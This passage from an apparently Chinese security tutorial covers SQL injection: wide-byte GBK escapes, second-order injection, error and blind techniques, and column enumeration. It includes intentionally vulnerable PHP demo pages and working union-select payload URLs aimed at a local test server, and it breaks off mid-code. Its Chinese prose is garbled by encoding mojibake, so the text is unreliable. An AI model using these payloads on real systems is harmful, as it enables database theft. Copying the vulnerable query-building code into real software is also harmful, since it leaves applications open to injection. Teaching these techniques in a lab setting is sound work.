ä¸Šé¢çš„æµ‹è¯•æ˜¯åœ¨å¯¹åº”çš„æ³¨å…¥æ–¹å¼ä¸­å…³é”®å­—æˆ–è€…ç‰¹æ®Šç¬¦å·æ²¡æœ‰è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹,çœŸå®ç¯å¢ƒä¸­ä¹Ÿä¸çŸ¥é“åˆ°åº•è¿‡æ»¤äº†ä»€ä¹ˆæˆ–è€…æ˜¯å…¶ä»–åŸå› ã€‚åœ¨ä¸èƒ½çœ‹åˆ°æºç çš„è€Œæƒ…å†µä¸‹,ä¹Ÿåªèƒ½fuzz(éšæœºæµ‹è¯•)</p><p><strong>æ³¨</strong>: ä¸Šé¢è¿™äº›åªæ˜¯æä¾›å¤§è‡´çš„æ€è·¯ã€‚è”åˆæ³¨å…¥,æŠ¥é”™æ³¨å…¥,ç›²æ³¨ä»¥åŠå…¶ä»–æ³¨å…¥æ–¹å¼æœ‰å¾ˆå¤š,è¿˜å¯ä»¥ç»“åˆç¼–ç ç­‰æˆ–è€…å…¶ä»–å¤§ä½¬æ€»ç»“çš„ä»€ä¹ˆæ–¹å¼ç»•è¿‡,éœ€è¦ç”¨åˆ°çš„æ—¶å€™å¯ä»¥æœé›†èµ„æ–™è¯¦ç»†çš„å­¦ä¹ ã€‚</p><h5 id="æŒ‰æ•°æ®åº“è¿”å›çš„ç»“æœåˆ†ç±»"><a href="#æŒ‰æ•°æ®åº“è¿”å›çš„ç»“æœåˆ†ç±»" class="headerlink" title="æŒ‰æ•°æ®åº“è¿”å›çš„ç»“æœåˆ†ç±»"></a>æŒ‰æ•°æ®åº“è¿”å›çš„ç»“æœåˆ†ç±»</h5><p>æ®æ•°æ®åº“è¿”å›çš„ç»“æœ,åˆ†ä¸ºå›æ˜¾æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€ç›²æ³¨ã€‚</p><h5 id="å›æ˜¾æ³¨å…¥"><a href="#å›æ˜¾æ³¨å…¥" class="headerlink" title="å›æ˜¾æ³¨å…¥"></a>å›æ˜¾æ³¨å…¥</h5><p>å¯ä»¥ç›´æ¥åœ¨å­˜åœ¨æ³¨å…¥ç‚¹çš„å½“å‰é¡µé¢ä¸­è·å–è¿”å›ç»“æœ,å¯ä»¥ä½¿ç”¨å›æ˜¾æ³¨å…¥ã€‚</p><p>å¸¸è§åˆ©ç”¨:</p><blockquote><p>union select</p></blockquote><h5 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h5><p>ç¨‹åºå°†æ•°æ®åº“çš„è¿”å›é”™è¯¯ä¿¡æ¯ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ã€‚è™½ç„¶æ²¡æœ‰è¿”å›æ•°æ®åº“çš„æŸ¥è¯¢ç»“æœ,ä½†æ˜¯å¯ä»¥æ„é€ ä¸€äº›æŠ¥é”™è¯­å¥ä»é”™è¯¯ä¿¡æ¯ä¸­è·å–æƒ³è¦çš„ç»“æœã€‚</p><p>å¸¸è§åˆ©ç”¨:</p><blockquote><p>floor<br>updatexml<br>extractvalue</p></blockquote><h5 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h5><p>ç¨‹åºåç«¯å±è”½äº†æ•°æ®åº“çš„é”™è¯¯ä¿¡æ¯ï¼Œæ²¡æœ‰ç›´æ¥æ˜¾ç¤ºç»“æœä¹Ÿæ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡æ•°æ®åº“çš„é€»è¾‘å’Œå»¶æ—¶å‡½æ•°æ¥åˆ¤æ–­æ³¨å…¥çš„ç»“æœã€‚</p><ul><li>boolç›²æ³¨(based boolean)<ul><li>å¦‚æœæµ‹è¯•æ—¶å‘ç°é¡µé¢æœ‰å˜åŒ–,å¯ä»¥å°è¯•ä½¿ç”¨boolç›²æ³¨</li></ul></li><li>æ—¶é—´ç›²æ³¨(based time)<ul><li>å¦‚æœæµ‹è¯•æ—¶é¡µé¢æ— å˜åŒ–,ä½†æ˜¯é€šè¿‡sleepå‘ç°é¡µé¢å­˜åœ¨å»¶è¿Ÿ,å¯ä»¥å°è¯•ä½¿ç”¨æ—¶é—´ç›²æ³¨</li></ul></li></ul><p>åˆ©ç”¨:</p><ul><li>Length()ã€Substr()ã€Ascii()ã€sleep()ã€if(expr1,expr2,expr3)ç­‰ç»“åˆä½¿ç”¨</li></ul><h5 id="å…¶ä»–ç‰¹æ®Šæ³¨å…¥"><a href="#å…¶ä»–ç‰¹æ®Šæ³¨å…¥" class="headerlink" title="å…¶ä»–ç‰¹æ®Šæ³¨å…¥"></a>å…¶ä»–ç‰¹æ®Šæ³¨å…¥</h5><h5 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h5><p>å½¢æˆæ¡ä»¶:</p><ul><li>å¼€å¯äº†<code>gpc</code>æˆ–ä½¿ç”¨<code>addslashes</code>ã€<code>mysql_real_escape_string</code>ã€<code>mysql_escape_string</code>ç­‰å¯¹å¼•å·è½¬ä¹‰çš„å‡½æ•°</li><li>ä½¿ç”¨äº†<code>SET NAMES å¤šå­—èŠ‚ç¼–ç </code>æˆ–è€…<code>set character_set_client=å¤šå­—èŠ‚ç¼–ç </code>æŒ‡ä»¤,è¿™é‡Œå¤šå­—èŠ‚ç¼–ç ä½ä½çš„èŒƒå›´éœ€è¦è¦†ç›–0x5Cæ‰èƒ½å¯¼è‡´æ³¨å…¥ã€‚æˆ‘ä»¬æœ€å¸¸è§çš„æ˜¯<code>gbk</code>ç¼–ç ã€‚</li></ul><p>å‡å¦‚ä»£ç ä¸­è®¾ç½®çš„æ˜¯GBKç¼–ç (mysqlé‚£ç«¯è¡¨æˆ–è€…å­—æ®µè®¾ç½®çš„ç¼–ç æ— å½±å“,ä¼šè‡ªåŠ¨è½¬æ¢),è¿™æ—¶åªè¦å¼•å…¥å®½å­—èŠ‚é«˜ä½ç¼–ç åƒæ‰<code>\</code>(%5c),å°±å¯¼è‡´äº†å®½å­—èŠ‚æ³¨å…¥çš„å‘ç”Ÿã€‚</p><p>å¯ä»¥å‚è€ƒ<a href="https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/">sqlæ³¨å…¥ï¼šå®½å­—èŠ‚æ³¨å…¥(gbkåŒå­—èŠ‚ç»•è¿‡)</a></p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS `test`;<br>CREATE TABLE IF NOT EXISTS `news` (<br>  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,<br>  `title` varchar(30) CHARACTER SET utf8 NOT NULL,<br>  `content` varchar(256) CHARACTER SET utf8 NOT NULL,<br>  PRIMARY KEY (`tid`)<br>) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;<br><br>INSERT INTO `news` (`tid`, `title`, `content`) VALUES<br>(1, &#x27;æ–°é—»1&#x27;, &#x27;è¿™æ˜¯ç¬¬ä¸€ç¯‡æ–‡ç« &#x27;),<br>(2, &#x27;æ–°é—»2&#x27;, &#x27;è¿™æ˜¯ç¬¬äºŒç¯‡æ–‡ç« &#x27;);<br></code></pre></td></tr></table></figure><p>sqlgbkinjection.php (test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//è¿æ¥æ•°æ®åº“éƒ¨åˆ†ï¼Œæ³¨æ„ä½¿ç”¨äº†gbkç¼–ç ï¼ŒæŠŠæ•°æ®åº“ä¿¡æ¯å¡«å†™è¿›å»</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;è¿æ¥æ•°æ®åº“å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ‚¨å¡«å†™çš„æ•°æ®åº“&quot;</span>);<br><span class="hljs-comment">//æ‰§è¡Œsqlè¯­å¥</span><br><span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) : <span class="hljs-number">1</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM news WHERE tid=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>()); <span class="hljs-comment">//sqlå‡ºé”™ä¼šæŠ¥é”™ï¼Œæ–¹ä¾¿è§‚å¯Ÿ</span><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;gbk&quot;</span> /&gt;<br>&lt;title&gt;æ–°é—»&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>, MYSQL_ASSOC);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;<span class="hljs-subst">&#123;$row[&#x27;title&#x27;]&#125;</span>&lt;/h2&gt;&lt;p&gt;<span class="hljs-subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;p&gt;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">mysql_free_result</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:<br><code>http://127.0.0.1/sqlgbkinjection.php?id=10%df%27%20union%20select%201,user(),database()%23</code></p><h5 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h5><p>é¦–å…ˆå°†æ„é€ å¥½çš„åˆ©ç”¨ä»£ç å†™å…¥ç½‘ç«™ä¿å­˜,å†ç¬¬äºŒæ¬¡æˆ–å¤šæ¬¡è¯·æ±‚åè°ƒç”¨æ”»å‡»ä»£ç è§¦å‘æˆ–è€…ä¿®æ”¹é…ç½®è§¦å‘çš„æ¼æ´ã€‚</p><p>æ¯”å¦‚sqläºŒæ¬¡æ³¨å…¥:</p><p>åœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº†<code> addslashes</code> æˆ–è€…æ˜¯å€ŸåŠ© <code>get_magic_quotes_gpc</code> å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«è¿˜æ˜¯è„æ•°æ®ã€‚</p><p>åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p><p>eg:<br>æ•°æ®è¡¨ä½¿ç”¨çš„æ˜¯ä¸Šé¢newsè¡¨</p><p>secondaryinjection.php (test on mysql 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;è¿æ¥æ•°æ®åº“å¤±è´¥ï¼Œæœªæ‰¾åˆ°æ‚¨å¡«å†™çš„æ•°æ®åº“&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$tid</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tid&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123;<br>        <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$title</span>);<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO news(tid,title,content) VALUES (<span class="hljs-subst">$tid</span>,&#x27;<span class="hljs-subst">$title</span>&#x27;,&#x27;<span class="hljs-subst">$content</span>&#x27;)&quot;</span>;<br>    <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where tid=<span class="hljs-subst">$tid</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$results</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$results</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;tid&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;tid&#x27;</span>];<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-variable">$results</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$results</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>].<span class="hljs-string">&#x27;    &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Try create a new&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/secondaryinjection.php?tid=6&amp;title=aaa%27 union select 1,user(),3%23&amp;content=qqqqq</code></p><p><code>http://127.0.0.1/secondaryinjection.php</code></p><h3 id="æ£€æµ‹åˆ¤æ–­sqlæ³¨å…¥ï¼š"><a href="#æ£€æµ‹åˆ¤æ–­sqlæ³¨å…¥ï¼š" class="headerlink" title="æ£€æµ‹åˆ¤æ–­sqlæ³¨å…¥ï¼š"></a>æ£€æµ‹åˆ¤æ–­sqlæ³¨å…¥ï¼š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=0 //æŠ¥é”™</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>æ­£ç¡®<br></code></pre></td></tr></table></figure><h3 id="åˆ¤æ–­ä»€ä¹ˆç±»å‹æ³¨å…¥ï¼š"><a href="#åˆ¤æ–­ä»€ä¹ˆç±»å‹æ³¨å…¥ï¼š" class="headerlink" title="åˆ¤æ–­ä»€ä¹ˆç±»å‹æ³¨å…¥ï¼š"></a>åˆ¤æ–­ä»€ä¹ˆç±»å‹æ³¨å…¥ï¼š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">id=1&quot;</span><br></code></pre></td></tr></table></figure><p>å¯åŠ  â€œ\â€ ç­‰ç¬¦å·ï¼Œæ„é€ æŠ¥é”™ï¼Œä»æŠ¥é”™å›æ˜¾ä¸­è§‚å¯Ÿæ˜¯ä»€ä¹ˆç±»å‹çš„é”™è¯¯ï¼Œå¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;our input&#x27;</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>our input<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;out input&#x27;</span>)<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(&quot;our input&quot;)<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/12S2uT.png" alt="12S2uT.png"></p><p>åŸç†å¦‚ä¸Š</p><h3 id="æ•°æ®åº“æŸ¥è¯¢ç‰ˆæœ¬"><a href="#æ•°æ®åº“æŸ¥è¯¢ç‰ˆæœ¬" class="headerlink" title="æ•°æ®åº“æŸ¥è¯¢ç‰ˆæœ¬"></a>æ•°æ®åº“æŸ¥è¯¢ç‰ˆæœ¬</h3><ul><li>Mssql: select @@version</li><li>Mysql: select versionï¼ˆï¼‰&#x2F;select @@version</li><li>oracle: select banner from ï¿¥version</li><li>Postgresql: select versionï¼ˆï¼‰</li></ul><h3 id="åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Ÿ"><a href="#åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Ÿ" class="headerlink" title="åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Ÿ"></a>åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼Ÿ</h3><p>é‡‡ç”¨å¼‚æˆ–æ³¨å…¥ã€‚<br>åœ¨id&#x3D;1åé¢è¾“å…¥ â€˜(0)â€™<br>å‘ç°ä¸å‡ºé”™ï¼Œé‚£å°±å°†0æ¢æˆ1&#x3D;1<br>å¦‚æœå‡ºé”™ï¼Œé‚£å°±æ˜¯æˆåŠŸäº†</p><p>å¦‚æœæ‹¬å·é‡Œé¢çš„åˆ¤æ–­æ˜¯å‡çš„ï¼Œé‚£ä¹ˆé¡µé¢å°±ä¼šæ˜¾ç¤ºæ­£ç¡®<br>é‚£ä¹ˆåŒç†ï¼Œ<br>å¦‚æœä¿®æ”¹é‡Œé¢çš„å†…å®¹ä¸ºlength(â€˜unionâ€™)!&#x3D;0<br>å¦‚æœé¡µé¢æ˜¾ç¤ºæ­£ç¡®ï¼Œé‚£å°±è¯æ˜length(â€˜unionâ€™)&#x3D;&#x3D;0çš„ï¼Œä¹Ÿå°±æ˜¯unionè¢«è¿‡æ»¤äº†</p><h3 id="åˆ¤æ–­å­—æ®µé•¿åº¦"><a href="#åˆ¤æ–­å­—æ®µé•¿åº¦" class="headerlink" title="åˆ¤æ–­å­—æ®µé•¿åº¦"></a>åˆ¤æ–­å­—æ®µé•¿åº¦</h3><ul><li>order by æ•°å­— å¯ä»¥åˆ¤æ–­å­—æ®µçš„ä¸ªæ•°</li><li>ä¹Ÿå¯ä»¥ç”¨çŒœå­—æ®µ union select 1ï¼Œ2ï¼Œ3</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>...<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by n</span><br></code></pre></td></tr></table></figure><p>å¦‚æœnå‡ºç°äº†é”™è¯¯é‚£ä¹ˆå…±æœ‰n-1åˆ—ï¼ŒunionæŸ¥è¯¢å¿…é¡»åˆ—æ•°é‡å¯¹é½ï¼Œä¹Ÿå°±æ˜¯è¯´union select 1,2,â€¦,n-1 from â€¦</p><h3 id="åˆ¤æ–­å­—æ®µå›æ˜¾ä½ç½®"><a href="#åˆ¤æ–­å­—æ®µå›æ˜¾ä½ç½®" class="headerlink" title="åˆ¤æ–­å­—æ®µå›æ˜¾ä½ç½®"></a>åˆ¤æ–­å­—æ®µå›æ˜¾ä½ç½®</h3><p>åœ¨é“¾æ¥åé¢æ·»åŠ è¯­å¥<code>union select 1,2,3,4,5,6,7,8,9,10,11#</code>è¿›è¡Œè”åˆæŸ¥è¯¢ï¼ˆè”åˆæŸ¥è¯¢æ—¶è®°å¾—æŠŠå‰é¢çš„æŸ¥è¯¢ä¸ºç©ºï¼‰æ¥æš´éœ²å¯æŸ¥è¯¢çš„å­—æ®µå·ã€‚</p><h3 id="åˆ¤æ–­æ•°æ®åº“æ³¨å…¥"><a href="#åˆ¤æ–­æ•°æ®åº“æ³¨å…¥" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“æ³¨å…¥"></a>åˆ¤æ–­æ•°æ®åº“æ³¨å…¥</h3><p>åˆ©ç”¨å†…ç½®å‡½æ•°æš´æ•°æ®åº“ä¿¡æ¯<br>version()ç‰ˆæœ¬ï¼›database()æ•°æ®åº“ï¼›user()ç”¨æˆ·ï¼›<br>ä¸ç”¨çŒœè§£å¯ç”¨å­—æ®µæš´æ•°æ®åº“ä¿¡æ¯(æœ‰äº›ç½‘ç«™ä¸é€‚ç”¨):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> version()<br><span class="hljs-keyword">and</span> <span 